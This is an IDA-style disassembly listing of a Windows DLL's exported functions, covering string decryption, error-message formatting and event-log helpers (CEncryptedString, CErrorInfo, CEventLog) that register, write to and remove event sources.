; Exported entry 693.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal692
Ordinal692	proc near		; DATA XREF: .rdata:6AF5BE88o
					; .rdata:6AF5BE8Co ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	[esp+arg_4]	; ccL30_692
		push	[esp+4+arg_0]
		call	Ordinal694
		xor	eax, eax
		inc	eax
		retn	8
Ordinal692	endp

; Exported entry 686.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal686
Ordinal686	proc near		; CODE XREF: sub_6AF42EE6+3p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+20h]
		mov	dword ptr [esi], offset	off_6AF5BE84
		call	Ordinal1279
		lea	ecx, [esi+10h]
		call	Ordinal863
		lea	ecx, [esi+4]
		pop	esi
		jmp	sub_6AF3789B
Ordinal686	endp

; Exported entry 685.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal685
Ordinal685	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	esi
		mov	esi, ecx
		lea	ecx, [esi+4]
		mov	dword ptr [esi], offset	off_6AF5BE84
		call	sub_6AF318C3
		mov	eax, [esp+4+arg_0]
		mov	[esi+8], eax
		mov	eax, [esp+4+arg_4]
		lea	ecx, [esi+10h]
		mov	[esi+0Ch], eax
		call	Ordinal861
		lea	ecx, [esi+20h]
		call	Ordinal1278
		mov	eax, esi
		pop	esi
		retn	8
Ordinal685	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF42EE6(void *, char)
sub_6AF42EE6	proc near		; DATA XREF: .rdata:off_6AF5BE84o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal686
		test	[esp+4+arg_0], 1
		jz	short loc_6AF42EFC
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF42EFC:				; CODE XREF: sub_6AF42EE6+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF42EE6	endp

; Exported entry 688.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal688
Ordinal688	proc near		; CODE XREF: Ordinal690+3p
					; Ordinal687+3p
					; DATA XREF: ...

var_5C		= byte ptr -5Ch
var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= byte ptr -48h
var_28		= dword	ptr -28h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4

		mov	eax, offset unknown_libname_78 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 50h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		mov	[ebp+var_14], eax
		push	0FFFFFFFFh
		lea	eax, [esi+20h]
		push	eax
		lea	ecx, [ebp+var_5C]
		mov	[ebp+var_28], esi
		call	Ordinal1228
		lea	edi, [esi+4]
		mov	eax, [edi]
		cmp	[eax-0Ch], ebx
		mov	[ebp+var_4], ebx
		jz	short loc_6AF42F50
		lea	ecx, [ebp+var_5C]
		call	Ordinal1230
		xor	eax, eax
		inc	eax
		jmp	loc_6AF4306E
; ---------------------------------------------------------------------------

loc_6AF42F50:				; CODE XREF: Ordinal688+3Cj
		mov	eax, [esi+0Ch]
		inc	eax
		push	eax
		lea	ecx, [esi+10h]
		call	Ordinal870
		mov	ebx, eax
		test	ebx, ebx
		jnz	short loc_6AF42F6A
		push	offset aCencryptedstri ; "CEncryptedString::Decrypt() :	m_DecData"...
		jmp	short loc_6AF42F8D
; ---------------------------------------------------------------------------

loc_6AF42F6A:				; CODE XREF: Ordinal688+5Fj
		push	dword ptr [esi+0Ch] ; Size
		push	dword ptr [esi+8] ; Src
		push	ebx		; Dst
		call	memcpy
		mov	eax, [esi]
		add	esp, 0Ch
		push	dword ptr [esi+0Ch]
		mov	ecx, esi
		push	ebx		; Args
		call	dword ptr [eax+4]
		test	eax, eax
		jnz	short loc_6AF42F98
		push	offset aCencryptedst_0 ; "CEncryptedString::Decrypt() :	Decrypt()"...

loc_6AF42F8D:				; CODE XREF: Ordinal688+66j
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF43059
; ---------------------------------------------------------------------------

loc_6AF42F98:				; CODE XREF: Ordinal688+84j
		push	offset aCencryptedst_1 ; "CEncryptedString::Decrypt()"
		lea	ecx, [ebp+var_48]
		call	Ordinal751
		push	ebx		; Src
		mov	ecx, edi
		mov	byte ptr [ebp+var_4], 2
		call	sub_6AF31B1D
		jmp	loc_6AF43051
; ---------------------------------------------------------------------------

loc_6AF42FB6:				; DATA XREF: .rdata:6AF633B0o
		push	13h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	ecx, [ebp+var_50]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4304E
		retn
; ---------------------------------------------------------------------------

loc_6AF42FF9:				; DATA XREF: .rdata:6AF633C0o
		push	15h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	eax, [ebp+var_4C]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4304E
		retn
; ---------------------------------------------------------------------------

loc_6AF4304E:				; DATA XREF: Ordinal688+F1o
					; Ordinal688+146o
		mov	esi, [ebp+var_28]

loc_6AF43051:				; CODE XREF: Ordinal688+AFj
		lea	ecx, [ebp+var_48]
		call	Ordinal752

loc_6AF43059:				; CODE XREF: Ordinal688+91j
		mov	eax, [esi+4]
		mov	esi, [eax-0Ch]
		lea	ecx, [ebp+var_5C]
		call	Ordinal1230
		xor	eax, eax
		test	esi, esi
		setnz	al

loc_6AF4306E:				; CODE XREF: Ordinal688+49j
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
Ordinal688	endp ; sp-analysis failed

; Exported entry 690.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal690
Ordinal690	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal688
		lea	ecx, [esi+10h]
		pop	esi
		jmp	Ordinal865
Ordinal690	endp

; Exported entry 687.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal687
Ordinal687	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal688
		mov	eax, [esi+4]
		cmp	dword ptr [eax-0Ch], 0
		pop	esi
		jnz	short locret_6AF430AD
		mov	eax, offset dword_6AF5BCB0

locret_6AF430AD:			; CODE XREF: Ordinal687+10j
		retn
Ordinal687	endp

; Exported entry 698.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal698
Ordinal698	proc near		; CODE XREF: sub_6AF43144+3p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		mov	eax, [esi+4]
		test	eax, eax
		mov	dword ptr [esi], offset	off_6AF5BF1C
		jz	short loc_6AF430C9
		push	eax		; hMem
		call	ds:LocalFree
		and	dword ptr [esi+4], 0

loc_6AF430C9:				; CODE XREF: Ordinal698+Ej
		pop	esi
		retn
Ordinal698	endp

; Exported entry 699.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal699
Ordinal699	proc near		; DATA XREF: .rdata:off_6AF66098o
		and	dword ptr [ecx+4], 0
		and	dword ptr [ecx+8], 0
		retn
Ordinal699	endp

; Exported entry 704.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal704
Ordinal704	proc near		; CODE XREF: Ordinal700+7p
					; Ordinal701+15p
					; DATA XREF: ...
		push	esi
		push	edi
		mov	edi, ecx
		lea	esi, [edi+4]
		mov	eax, [esi]
		test	eax, eax
		jz	short loc_6AF430EB
		push	eax		; hMem
		call	ds:LocalFree
		and	dword ptr [esi], 0

loc_6AF430EB:				; CODE XREF: Ordinal704+Bj
		push	0		; Arguments
		push	0		; nSize
		push	esi		; lpBuffer
		push	400h		; dwLanguageId
		push	dword ptr [edi+8] ; dwMessageId
		push	0		; lpSource
		push	1100h		; dwFlags
		call	ds:FormatMessageA
		test	eax, eax
		jnz	short loc_6AF43120
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCerrorinfoBuil ; "CErrorInfo::BuildDescription() : Format"...
		call	sub_6AF3101A
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF43130
; ---------------------------------------------------------------------------

loc_6AF43120:				; CODE XREF: Ordinal704+33j
		push	offset pszTrimChars ; "\r\n"
		push	dword ptr [esi]	; psz
		call	ds:StrTrimA
		xor	eax, eax
		inc	eax

loc_6AF43130:				; CODE XREF: Ordinal704+4Aj
		pop	edi
		pop	esi
		retn
Ordinal704	endp

; Exported entry 695.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal695
Ordinal695	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, ecx
		and	dword ptr [eax+4], 0
		and	dword ptr [eax+8], 0
		mov	dword ptr [eax], offset	off_6AF5BF1C
		retn
Ordinal695	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF43144(void *, char)
sub_6AF43144	proc near		; DATA XREF: .rdata:off_6AF5BF1Co

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal698
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4315A
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4315A:				; CODE XREF: sub_6AF43144+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF43144	endp

; Exported entry 700.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal700
Ordinal700	proc near		; CODE XREF: Ordinal697+15p
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	[ecx+8], eax
		call	Ordinal704
		retn	4
Ordinal700	endp

; Exported entry 701.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal701
Ordinal701	proc near		; CODE XREF: Ordinal696+15p
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		test	eax, eax
		jle	short loc_6AF43181
		and	eax, 0FFFFh
		or	eax, 80070000h

loc_6AF43181:				; CODE XREF: Ordinal701+6j
		mov	[ecx+8], eax
		call	Ordinal704
		retn	4
Ordinal701	endp

; Exported entry 696.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal696
Ordinal696	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		and	dword ptr [esi+4], 0
		and	dword ptr [esi+8], 0
		mov	dword ptr [esi], offset	off_6AF5BF1C
		call	Ordinal701
		mov	eax, esi
		pop	esi
		retn	4
Ordinal696	endp

; Exported entry 697.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal697
Ordinal697	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		and	dword ptr [esi+4], 0
		and	dword ptr [esi+8], 0
		mov	dword ptr [esi], offset	off_6AF5BF1C
		call	Ordinal700
		mov	eax, esi
		pop	esi
		retn	4
Ordinal697	endp

; Exported entry 705.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal705
Ordinal705	proc near		; CODE XREF: Ordinal1072+4Ap
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		and	dword ptr [esi+4], 0
		and	dword ptr [esi+8], 0
		lea	ecx, [esi+0Ch]
		mov	dword ptr [esi], offset	off_6AF5BFC8
		call	Ordinal861
		and	dword ptr [esi+1Ch], 0
		and	dword ptr [esi+20h], 0
		lea	ecx, [esi+24h]
		call	Ordinal1278
		mov	eax, esi
		pop	esi
		retn
Ordinal705	endp

; Exported entry 708.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal708(LPCSTR pszSubKey)
		public Ordinal708
Ordinal708	proc near		; CODE XREF: Ordinal707+3Cp
					; DATA XREF: .rdata:off_6AF66098o

var_18		= byte ptr -18h
var_C		= byte ptr -0Ch
pszSubKey	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 18h
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+24h]
		push	eax
		lea	ecx, [ebp+var_18]
		call	Ordinal1228
		lea	ecx, [ebp+var_C]
		call	Ordinal988
		push	1		; int
		push	20006h		; samDesired
		push	offset Src	; "SYSTEM\\CurrentControlSet\\Services\\Event"...
		push	80000002h	; hKey
		lea	ecx, [ebp+var_C]
		call	Ordinal993
		test	eax, eax
		jz	short loc_6AF4324B
		push	[ebp+pszSubKey]	; pszSubKey
		lea	ecx, [ebp+var_C]
		call	Ordinal995
		test	eax, eax
		jz	short loc_6AF4324B
		xor	esi, esi
		inc	esi
		jmp	short loc_6AF43263
; ---------------------------------------------------------------------------

loc_6AF4324B:				; CODE XREF: Ordinal708+3Cj
					; Ordinal708+4Bj
		push	offset aCeventlogUnreg ; "CEventLog::Unregister() : reg.DeleteKey"...
		call	sub_6AF3102E
		pop	ecx
		lea	ecx, [ebp+var_C]
		call	Ordinal236
		mov	[esi+8], eax
		xor	esi, esi

loc_6AF43263:				; CODE XREF: Ordinal708+50j
		lea	ecx, [ebp+var_C]
		call	Ordinal990
		lea	ecx, [ebp+var_18]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn	4
Ordinal708	endp

; Exported entry 710.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal710
Ordinal710	proc near		; CODE XREF: Ordinal706+9p
					; Ordinal709+2Ep ...

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+24h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	eax, [esi+4]
		xor	ebx, ebx
		inc	ebx
		test	eax, eax
		jz	short loc_6AF432B4
		push	eax		; hEventLog
		call	DeregisterEventSource
		mov	ebx, eax
		call	ds:GetLastError
		and	dword ptr [esi+4], 0
		mov	[esi+8], eax

loc_6AF432B4:				; CODE XREF: Ordinal710+22j
		lea	ecx, [esi+0Ch]
		call	Ordinal874
		and	dword ptr [esi+1Ch], 0
		and	dword ptr [esi+20h], 0
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	esi
		mov	eax, ebx
		pop	ebx
		leave
		retn
Ordinal710	endp

; Exported entry 711.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal711
Ordinal711	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+24h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	esi, [esi+8]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal711	endp

; Exported entry 712.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal712
Ordinal712	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+24h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		xor	eax, eax
		cmp	[esi+4], eax
		lea	ecx, [ebp+var_C]
		setnz	al
		mov	esi, eax
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal712	endp

; Exported entry 744.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal744
Ordinal744	proc near		; CODE XREF: Ordinal739+1Ap
					; Ordinal740+1Ap ...

var_130		= byte ptr -130h
pcbBuffer	= dword	ptr -124h
peUse		= dword	ptr -120h
cchReferencedDomainName= dword ptr -11Ch
Dst		= byte ptr -118h
ReferencedDomainName= byte ptr -14h
var_4		= dword	ptr -4
wType		= word ptr  8
dwEventID	= dword	ptr  0Ch
wNumStrings	= word ptr  10h
lpStrings	= dword	ptr  14h
wCategory	= word ptr  18h
dwDataSize	= dword	ptr  1Ch
lpRawData	= dword	ptr  20h
lpUserSid	= dword	ptr  24h

		push	ebp
		mov	ebp, esp
		sub	esp, 130h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		mov	[ebp+var_4], eax
		push	0FFFFFFFFh
		lea	eax, [esi+24h]
		push	eax
		lea	ecx, [ebp+var_130]
		call	Ordinal1228
		cmp	[esi+4], ebx
		jnz	short loc_6AF43369
		push	offset aCeventlogLogM_ ; "CEventLog::Log() : m_hSource == NULL\n"
		call	sub_6AF3101A

loc_6AF43363:				; CODE XREF: Ordinal744+163j
		pop	ecx
		jmp	loc_6AF43496
; ---------------------------------------------------------------------------

loc_6AF43369:				; CODE XREF: Ordinal744+2Cj
		mov	eax, [ebp+lpUserSid]
		cmp	eax, ebx
		jnz	loc_6AF43456
		cmp	[esi+1Ch], ebx
		jnz	loc_6AF43453
		cmp	[esi+20h], ebx
		jnz	loc_6AF43453
		push	edi		; Args
		mov	edi, 101h
		push	edi		; Size
		lea	eax, [ebp+Dst]
		push	ebx		; Val
		push	eax		; Dst
		call	memset
		add	esp, 0Ch
		lea	eax, [ebp+pcbBuffer]
		push	eax		; pcbBuffer
		lea	eax, [ebp+Dst]
		push	eax		; lpBuffer
		mov	[ebp+pcbBuffer], edi
		call	GetUserNameA
		test	eax, eax
		jz	loc_6AF43440
		mov	edi, LookupAccountNameA
		lea	eax, [ebp+peUse]
		push	eax		; peUse
		lea	eax, [ebp+cchReferencedDomainName]
		push	eax		; cchReferencedDomainName
		lea	eax, [ebp+ReferencedDomainName]
		push	eax		; ReferencedDomainName
		lea	eax, [ebp+lpUserSid]
		push	eax		; cbSid
		push	ebx		; Sid
		lea	eax, [ebp+Dst]
		push	eax		; lpAccountName
		push	ebx		; lpSystemName
		mov	[ebp+lpUserSid], ebx
		mov	[ebp+cchReferencedDomainName], 10h
		mov	[ebp+peUse], 8
		call	edi ; LookupAccountNameA
		test	eax, eax
		jnz	short loc_6AF43452
		cmp	[ebp+lpUserSid], ebx
		jbe	short loc_6AF43452
		push	[ebp+lpUserSid]
		lea	ecx, [esi+0Ch]
		call	Ordinal870
		lea	ecx, [ebp+peUse]
		push	ecx		; peUse
		lea	ecx, [ebp+cchReferencedDomainName]
		push	ecx		; cchReferencedDomainName
		lea	ecx, [ebp+ReferencedDomainName]
		push	ecx		; ReferencedDomainName
		lea	ecx, [ebp+lpUserSid]
		push	ecx		; cbSid
		push	eax		; Sid
		mov	[esi+1Ch], eax
		lea	eax, [ebp+Dst]
		push	eax		; lpAccountName
		push	ebx		; lpSystemName
		call	edi ; LookupAccountNameA
		test	eax, eax
		jnz	short loc_6AF43452
		push	offset aCeventlogLogLo ; "CEventLog::Log() : LookupAccountName() "...
		jmp	short loc_6AF43445
; ---------------------------------------------------------------------------

loc_6AF43440:				; CODE XREF: Ordinal744+8Ej
		push	offset aCeventlogLogGe ; "CEventLog::Log() : GetUserName() == FAL"...

loc_6AF43445:				; CODE XREF: Ordinal744+113j
		call	sub_6AF3102E
		pop	ecx
		mov	dword ptr [esi+20h], 1

loc_6AF43452:				; CODE XREF: Ordinal744+D4j
					; Ordinal744+D9j ...
		pop	edi

loc_6AF43453:				; CODE XREF: Ordinal744+4Cj
					; Ordinal744+55j
		mov	eax, [esi+1Ch]

loc_6AF43456:				; CODE XREF: Ordinal744+43j
		push	[ebp+lpRawData]	; lpRawData
		push	[ebp+lpStrings]	; lpStrings
		push	[ebp+dwDataSize] ; dwDataSize
		push	dword ptr [ebp+wNumStrings] ; wNumStrings
		push	eax		; lpUserSid
		push	[ebp+dwEventID]	; dwEventID
		push	dword ptr [ebp+wCategory] ; wCategory
		push	dword ptr [ebp+wType] ;	wType
		push	dword ptr [esi+4] ; hEventLog
		call	ReportEventA
		test	eax, eax
		jnz	short loc_6AF43493
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCeventlogLogRe ; "CEventLog::Log() : ReportEvent() == 0, "...
		mov	[esi+8], eax
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF43363
; ---------------------------------------------------------------------------

loc_6AF43493:				; CODE XREF: Ordinal744+14Cj
		xor	ebx, ebx
		inc	ebx

loc_6AF43496:				; CODE XREF: Ordinal744+39j
		lea	ecx, [ebp+var_130]
		call	Ordinal1230
		mov	ecx, [ebp+var_4]
		pop	esi
		mov	eax, ebx
		pop	ebx
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn	20h
Ordinal744	endp ; sp-analysis failed

; Exported entry 706.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal706
Ordinal706	proc near		; CODE XREF: sub_6AF435FC+3p
					; Ordinal1073+1Ap
					; DATA XREF: ...
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5BFC8
		call	Ordinal710
		lea	ecx, [esi+24h]
		call	Ordinal1279
		lea	ecx, [esi+0Ch]
		pop	esi
		jmp	Ordinal863
Ordinal706	endp

; Exported entry 709.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal709(LPCSTR lpSourceName)
		public Ordinal709
Ordinal709	proc near		; CODE XREF: Ordinal1074+514p
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
lpSourceName	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+24h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		cmp	[ebp+lpSourceName], 0
		jz	short loc_6AF43531
		push	[ebp+lpSourceName] ; lpString
		call	ds:lstrlenA
		test	eax, eax
		jz	short loc_6AF43531
		mov	ecx, esi
		call	Ordinal710
		push	[ebp+lpSourceName] ; lpSourceName
		push	0		; lpUNCServerName
		call	RegisterEventSourceA
		test	eax, eax
		mov	[esi+4], eax
		jnz	short loc_6AF4352C
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCeventlogOpenR ; "CEventLog::Open() : RegisterEventSource"...
		mov	[esi+8], eax
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF4353B
; ---------------------------------------------------------------------------

loc_6AF4352C:				; CODE XREF: Ordinal709+43j
		xor	esi, esi
		inc	esi
		jmp	short loc_6AF4353E
; ---------------------------------------------------------------------------

loc_6AF43531:				; CODE XREF: Ordinal709+1Dj
					; Ordinal709+2Aj
		push	offset aCeventlogOpenS ; "CEventLog::Open() : szName ==	NULL\n"
		call	sub_6AF3102E

loc_6AF4353B:				; CODE XREF: Ordinal709+5Aj
		pop	ecx
		xor	esi, esi

loc_6AF4353E:				; CODE XREF: Ordinal709+5Fj
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn	4
Ordinal709	endp

; Exported entry 739.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal739
Ordinal739	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch
arg_18		= dword	ptr  20h

		push	ebp
		mov	ebp, esp
		push	[ebp+arg_18]
		push	[ebp+arg_14]
		push	[ebp+arg_10]
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		push	1
		call	Ordinal744
		pop	ebp
		retn	1Ch
Ordinal739	endp

; Exported entry 740.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal740
Ordinal740	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch
arg_18		= dword	ptr  20h

		push	ebp
		mov	ebp, esp
		push	[ebp+arg_18]
		push	[ebp+arg_14]
		push	[ebp+arg_10]
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		push	2
		call	Ordinal744
		pop	ebp
		retn	1Ch
Ordinal740	endp

; Exported entry 741.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal741
Ordinal741	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch
arg_18		= dword	ptr  20h

		push	ebp
		mov	ebp, esp
		push	[ebp+arg_18]
		push	[ebp+arg_14]
		push	[ebp+arg_10]
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		push	4
		call	Ordinal744
		pop	ebp
		retn	1Ch
Ordinal741	endp

; Exported entry 742.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal742
Ordinal742	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch
arg_18		= dword	ptr  20h

		push	ebp
		mov	ebp, esp
		push	[ebp+arg_18]
		push	[ebp+arg_14]
		push	[ebp+arg_10]
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		push	10h
		call	Ordinal744
		pop	ebp
		retn	1Ch
Ordinal742	endp

; Exported entry 743.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal743
Ordinal743	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch
arg_18		= dword	ptr  20h

		push	ebp
		mov	ebp, esp
		push	[ebp+arg_18]
		push	[ebp+arg_14]
		push	[ebp+arg_10]
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		push	8
		call	Ordinal744
		pop	ebp
		retn	1Ch
Ordinal743	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF435FC(void *, char)
sub_6AF435FC	proc near		; DATA XREF: .rdata:off_6AF5BFC8o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal706
		test	[esp+4+arg_0], 1
		jz	short loc_6AF43612
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF43612:				; CODE XREF: sub_6AF435FC+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF435FC	endp

; Exported entry 720.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal720
Ordinal720	proc near		; DATA XREF: .rdata:off_6AF66098o
		xor	eax, eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	4000001Ah
		push	4
		call	Ordinal744
		retn
Ordinal720	endp

; Exported entry 721.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal721
Ordinal721	proc near		; DATA XREF: .rdata:off_6AF66098o
		xor	eax, eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	40000001h
		push	4
		call	Ordinal744
		retn
Ordinal721	endp

; Exported entry 722.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal722
Ordinal722	proc near		; DATA XREF: .rdata:off_6AF66098o
		xor	eax, eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	4000001Bh
		push	4
		call	Ordinal744
		retn
Ordinal722	endp

; Exported entry 723.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal723
Ordinal723	proc near		; DATA XREF: .rdata:off_6AF66098o
		xor	eax, eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	40000002h
		push	4
		call	Ordinal744
		retn
Ordinal723	endp

